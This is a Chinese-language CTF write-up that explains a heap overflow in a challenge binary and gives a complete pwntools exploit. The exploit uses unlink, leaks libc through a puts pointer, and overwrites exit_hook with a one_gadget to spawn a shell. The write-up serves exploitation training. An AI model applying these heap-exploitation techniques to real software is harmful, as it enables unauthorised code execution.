# how2heap  
### 程序逻辑  
程序可以进行的操作有  
* add:新建一个chunk并在chunk中写上内容  
* delete：删除一个已有的chunk，free后将指针指向NULL，不存在UAF漏洞
* show:显示指定chunk中的内容 
* edit：对指定的chunk的内容进行编辑，不过只能对第8和第9个chunk进行操作  
### 漏洞分析  
整个程序只有一个地方存在漏洞，改漏洞在菜单页时输入114514即可进入这个函数，下面为该函数的出题源码：  
```C
void sub_4040(){
    if(have_list[7]==0){
        return;
    }
    else if(one==0){
        one=1;
        int size = 0x10;
        a = malloc(size);
        return;
    }
    else if(one == 1){
        one = 2;
        read(0,a,0x20); 
        puts_ptr = &puts;
        return;
    }
    else
    exit(0);
}
```
可以看到该函数只有在第8个chunk给创建后才可以进行操作，而且只能够调用两次  
* 第一次：创建一个0x20大小的堆块(包括堆块头)  
* 第二次：向刚才创建的堆块中读入0x20字节的内容，并将堆上的函数指针指向puts函数的地址  
可见这个地方出现了0x10大小的堆溢出，0x10字节大小的溢出好可以覆盖下一个堆块的prev_size字段和size字段  
### 漏洞利用  
* 首先创建8个大小相同的堆块，然后调用sub_4040()函数，然后再创建第9个和前面大小相同的堆块  
* 然后将前7个chunk给释放掉，次数tcache已经给填满，然后利用edit在第8个chunk中伪造fake_chunk，并第二次调用sub_4040()将第9个chunk的pre_size和size进行修改，具体操作为：  
```python
p.sendline(str(114514))
payload = b'a' * 0x10 + p64(0xd0) + p64(0xc0)
p.sendline(payload)

payload = p64(0) + p64(0xd1) + p64(0x4040b8 - 0x18) + p64(0x4040b8 - 0x10)
edit(7,payload)
```  
* 此时将chunk 9删除后即可进行unlink，对任意内存进行读写。unlink的原理可以参考这一篇文章：https://blog.csdn.net/qq_41202237/article/details/108481889  
* 正常想法是通过unlink在got表处获取libc地址，可是这一题程序开启了Full RELRO，got表不可写，如果将指针指向got泄露完地址后就不能进行任何操作了，约等于这个unlink用完了，而且chunk的申请次数已经用完，无法再次进行unlink操作。  
* 想起前面第二次调用sub_4040()函数时有个函数指针指向了puts的地址，我们可以通过它来泄露地址，并且可以在edit时通过填充偏移另chunk 8的指针指向我们要修改的地方，进行修改  
* 这题将free_hook修改为ogg无法getshell,所以我们选择改exit_hook，exit_hook的相关利用可以参考这篇文章：https://www.cnblogs.com/pwnfeifei/p/15759130.html  
### 完整exp：
```python
from pwn import *
from LibcSearcher import *
from ctypes import *
from struct import pack

# p = process(["./ld-linux-x86-64.so.2", "./test"],
#             env={"LD_PRELOAD":"./libc.so.6"})

# p = process(["/mnt/d/desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so", "./my"],
#             env={"LD_PRELOAD":"/mnt/d/desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6"})

# p = process('./pwn')
p = remote("", )
context(arch='arm64', os='linux', log_level='debug')
elf = ELF('./task')
libc = ELF('./libc.so.6')
ld = ELF('./ld-linux-x86-64.so.2')

execve = [0xe3afe, 0xe3b01, 0xe3b04]

def add(size,content):
    p.recvuntil("please input your choice:\n")
    p.sendline(b'1')
    p.recvuntil('size:\n')
    p.sendline(str(size))
    p.recvuntil('content:\n')
    p.sendline(content)

def show(index):
    p.recvuntil("please input your choice:\n")
    p.sendline(b'4')
    p.recvuntil('index:\n')
    p.sendline(str(index))

def delete(index):
    p.recvuntil("please input your choice:\n")
    p.sendline(b'2')
    p.recvuntil('index:\n')
    p.sendline(str(index))

def edit(index,content):
    p.recvuntil("please input your choice:\n")
    p.sendline(b'3')
    p.recvuntil('index:\n')
    p.sendline(str(index))
    p.recvuntil('content:\n')
    p.send(content)

for i in range(7):
    add(0xb0,b'aaaaa')

add(0xb0,b'aaaaa')
p.sendline(str(114514))
add(0xb0,b'aaaaa')

for i in range(7):
    delete(str(i))

p.recvuntil("please input your choice:\n")

p.sendline(str(114514))
payload = b'a' * 0x10 + p64(0xd0) + p64(0xc0)
p.sendline(payload)

payload = p64(0) + p64(0xd1) + p64(0x4040b8 - 0x18) + p64(0x4040b8 - 0x10)
edit(7,payload)
delete(8)

payload = p64(0) * 3 + p64(0x404060)
edit(7,payload)
show(7)
puts_addr = u64(p.recv(6).ljust(8,b"\x00"))
print("puts_addr =",hex(puts_addr))

libc_base = puts_addr - libc.symbols['puts']
free_hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']

ld_base = libc_base + 0x1f4000
_rtld_global = ld_base + ld.sym['_rtld_global']
_dl_rtld_lock_recursive = _rtld_global + 0xf08
_dl_rtld_unlock_recursive = _rtld_global + 0xf10

for i in range(3):
    execve[i] += libc_base

payload = p64(0) * 11 + p64(_dl_rtld_lock_recursive)
edit(7,payload)
edit(7,p64(execve[0]))
p.sendline(b'6')

p.interactive()
```
